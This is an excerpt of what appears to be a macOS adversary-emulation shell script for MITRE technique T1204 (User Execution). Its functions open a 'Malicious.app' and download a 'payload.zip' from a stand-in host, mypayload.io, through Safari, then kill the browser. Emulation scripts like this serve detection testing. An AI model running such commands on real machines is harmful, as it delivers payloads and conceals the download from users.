...
TTP_ID="T1204" #replace with you coresponding ttp_id
...
OPEN_A_MALICIOUS_FILE=false
DOWNLOAD_A_MALICIOUS_FILE=false
...
PROCEDURE_NAME="open"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --open-a-malicious-file)
            OPEN_A_MALICIOUS_FILE=true
            ;;
        --download-a-malicious-file)
            DOWNLOAD_A_MALICIOUS_FILE=true
            ;;
            *)
...
SCRIPT:
  --open-a-malicious-file          The open command can be used to open a malicious macOS app from the terminal.
  --download-a-malicious-file      The following command downloads the payload.zip file in the default browser (Safari) and then kills 
...
# Execute functions for --open-a-malicious-file
if [ "$OPEN_A_MALICIOUS_FILE" = true ]; then
    core_debug_print "Executing functions for --open-a-malicious-file"
    result=$(execute_function execute_open_malicious_file)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --download-a-malicious-file
if [ "$DOWNLOAD_A_MALICIOUS_FILE" = true ]; then
    core_debug_print "Executing functions for --download-a-malicious-file"
    result=$(execute_function execute_download_malicious_file)
    raw_output="${raw_output}${result}"
fi
...
# Function: execute_open_malicious_file
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_open_malicious_file() {
    local result
    result=$(open Malicious.app 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_download_malicious_file
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_download_malicious_file() {
    local result
    result=$(open -g https://mypayload.io/payload.zip; sleep 3; killall Safari 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
